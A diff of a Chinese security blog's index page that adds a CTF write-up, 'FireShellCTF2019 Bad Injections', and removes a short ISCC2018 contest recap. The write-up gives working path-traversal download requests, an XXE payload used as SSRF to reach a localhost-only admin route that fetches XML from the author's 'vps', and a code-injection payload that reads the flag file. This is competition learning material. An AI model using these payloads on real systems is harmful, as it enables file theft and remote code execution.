@@ -90,6 +90,192 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/"> 
+                    FireShellCTF2019 Bad Injections解题记录 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-30   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="FireShellCTF2019-Bad-Injections解题记录"><a href="#FireShellCTF2019-Bad-Injections解题记录" class="headerlink" title="FireShellCTF2019 Bad Injections解题记录"></a>FireShellCTF2019 Bad Injections解题记录</h1><p>原文投稿安全客：<a href="https://www.anquanke.com/post/id/170381" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170381</a></p>
+<p>题目名称：Bad Injections</p>
+<p>题目地址：<a href="http://68.183.31.62:94" target="_blank" rel="noopener">http://68.183.31.62:94</a></p>
+<p>貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下</p>
+<p>主页面有四个功能，纯静态页面。右键about页面源码信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7566b0a62.png" alt></p>
+<p>给个本地web目录</p>
+<p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p>
+<p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p>
+<pre><code>68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</code></pre><p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p>
+<p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p>
+<p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p>
+<p>down一下download的源码，顺便fuzz一下Controllers的文件</p>
+<pre><code>68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</code></pre><p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p>
+<p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p>
+<p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p>
+<pre><code>68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</code></pre><p>/app/index.php</p>
+<pre><code>&lt;?php
+ini_set(&#39;display_errors&#39;,1);
+ini_set(&#39;display_startup_erros&#39;,1);
+error_reporting(E_ALL);
+require_once(&#39;Routes.php&#39;);
+
+function __autoload($class_name){
+  if(file_exists(&#39;./classes/&#39;.$class_name.&#39;.php&#39;)){
+    require_once &#39;./classes/&#39;.$class_name.&#39;.php&#39;;
+  }else if(file_exists(&#39;./Controllers/&#39;.$class_name.&#39;.php&#39;)){
+    require_once &#39;./Controllers/&#39;.$class_name.&#39;.php&#39;;
+  }
+
+}</code></pre><p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p>
+<pre><code>&lt;?php
+
+Route::set(&#39;index.php&#39;,function(){
+  Index::createView(&#39;Index&#39;);
+});
+
+Route::set(&#39;index&#39;,function(){
+  Index::createView(&#39;Index&#39;);
+});
+
+Route::set(&#39;about-us&#39;,function(){
+  AboutUs::createView(&#39;AboutUs&#39;);
+});
+
+Route::set(&#39;contact-us&#39;,function(){
+  ContactUs::createView(&#39;ContactUs&#39;);
+});
+
+Route::set(&#39;list&#39;,function(){
+  ContactUs::createView(&#39;Lista&#39;);
+});
+
+Route::set(&#39;verify&#39;,function(){   
+  if(!isset($_GET[&#39;file&#39;]) &amp;&amp; !isset($_GET[&#39;hash&#39;])){
+    Verify::createView(&#39;Verify&#39;);
+  }else{
+    Verify::verifyFile($_GET[&#39;file&#39;],$_GET[&#39;hash&#39;]);  //设置session，file和hash对应请求文件
+  }
+});
+
+
+Route::set(&#39;download&#39;,function(){
+  if(isset($_REQUEST[&#39;file&#39;]) &amp;&amp; isset($_REQUEST[&#39;hash&#39;])){
+    echo Download::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);
+  }else{
+    echo &#39;jdas&#39;;
+  }
+});
+
+Route::set(&#39;verify/download&#39;,function(){
+  Verify::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);
+});
+
+
+Route::set(&#39;custom&#39;,function(){
+  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);
+  $data = stream_get_contents($handler); // xml
+  if(strlen($data) &gt; 1){
+    Custom::Test($data);
+  }else{
+    Custom::createView(&#39;Custom&#39;);
+  }
+});
+
+Route::set(&#39;admin&#39;,function(){
+  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){
+    Admin::createView(&#39;Admin&#39;);
+  }else{
+    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){
+      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
+    }else{
+     echo &quot;;(&quot;;
+    }
+  }
+});
+
+Route::set(&#39;custom/sort&#39;,function(){
+  Custom::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
+});
+Route::set(&#39;index&#39;,function(){
+ Index::createView(&#39;Index&#39;);
+});</code></pre><p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p>
+<pre><code>Route::set(&#39;admin&#39;,function(){
+  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){
+    Admin::createView(&#39;Admin&#39;);
+  }else{
+    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){
+      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
+    }else{
+     echo &quot;;(&quot;;
+    }
+  }
+});</code></pre><p>找一下其他利用，再看Custom</p>
+<pre><code>Route::set(&#39;custom&#39;,function(){
+  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);
+  $data = stream_get_contents($handler); 
+  if(strlen($data) &gt; 1){
+    Custom::Test($data);
+  }else{
+    Custom::createView(&#39;Custom&#39;);
+  }
+});</code></pre><p>Custom::Test</p>
+<pre><code>class Custom extends Controller{
+  public static function Test($string){
+      $root = simplexml_load_string($string,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);
+      $test = $root-&gt;name;
+      echo $test;
+  }
+}</code></pre><p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p>
+<p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p>
+<p>poc:</p>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; 
+&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;
+&lt;note&gt;
+&lt;name&gt;&amp;file;&lt;/name&gt;
+&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p>
+<p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p>
+<p><code>http://vps/xxe.txt</code></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;root&gt;
+&lt;channel&gt;
+&lt;item&gt;
+&lt;link&gt;@hpdoger.me&lt;/link&gt;
+&lt;/item&gt;
+&lt;item&gt;
+&lt;link&gt;@souhu.com&lt;/link&gt;
+&lt;/item&gt;
+&lt;/channel&gt;
+&lt;/root&gt;</code></pre><p><code>POC</code></p>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; 
+&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;
+&lt;note&gt;
+&lt;name&gt;&amp;file;&lt;/name&gt;
+&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/01/26/安恒杯月赛19新年场WriteUp/"> 
                     安恒杯月赛19新年场WriteUp 
                 </a>
@@ -1429,44 +1615,6 @@ cookie传入参数login_data解析查库，用了json_decode，那么就可以�
             </div>
             <div class="continue">
             <a href="/2018/11/13/HCTF题解/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/10/22/ISCC2018 信阳杯线下赛小结/"> 
-                    ISCC2018 信阳杯线下赛小结 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-10-22   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <p>自己巨大的锅..感觉本能拿第一的，却只水了个第二。</p>
-<p>从这篇起以后的日子闭关反思</p>
-<h2 id="线下ctf"><a href="#线下ctf" class="headerlink" title="线下ctf"></a>线下ctf</h2><p>上午的线下ctf就不说了,一个misc两个逆向。web狗：？？？<br>而且misc巨坑，感觉也是比脑洞，b32出来了对比hex还原再crc32。当时B32解出来有乱码，一直在测试编码的道路上，但结束后问了西工的师傅们才发现路走偏了。要学会习惯用winhex分析，跟原始的zip比对….这就解释了为什么有个504的文件头了..总之ctf体验极差</p>
-<h2 id="高地赛"><a href="#高地赛" class="headerlink" title="高地赛"></a>高地赛</h2><p>当时拿到题目是两个私地，一个pwn，一个web.高地也是一个pwn<br>看到网上有这么个吐槽：<br>选手：“ISCC你又出新题啦！”</p>
-<p>当时看到题,第一反应是17年的原题,ez的前端太好辨识了..<br>最扯淡的是，给了Mongodb的配置和17年的也一样..甚至连后台账号密码都没变。不过一开始我万能密码也进去了。但自己菜的也是真实，作为第一个打全场的队伍，后来权限没稳住又被别人反超…</p>
-<p>Always onload，还有很多要学的</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
